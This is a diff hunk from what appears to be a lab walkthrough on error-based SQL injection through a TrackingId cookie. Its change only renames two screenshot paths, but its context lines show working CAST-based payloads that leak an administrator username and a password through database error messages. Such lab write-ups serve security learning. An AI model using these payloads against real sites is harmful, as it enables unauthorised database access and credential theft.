@@ -47,11 +47,11 @@ Unterminated string literal...
 
 * `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` → Error: invalid input syntax for type integer: "administrator" → **Username leaked: administrator**
 
-![check datatype column](images/14/payload_ck2_vl.png)
+![check datatype column](images/14/payload_ck2_vld.png)
 
 It also checked tracking id so first remove that and again checked and its worked.
 
-![check datatype column](images/14/payload_ck3_Id_rm.png)
+![check datatype column](images/14/payload_ck3_ld_rm.png)
 
 * `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` → Error: invalid input syntax for type integer: "[PASSWORD]" → **Password leaked**
 
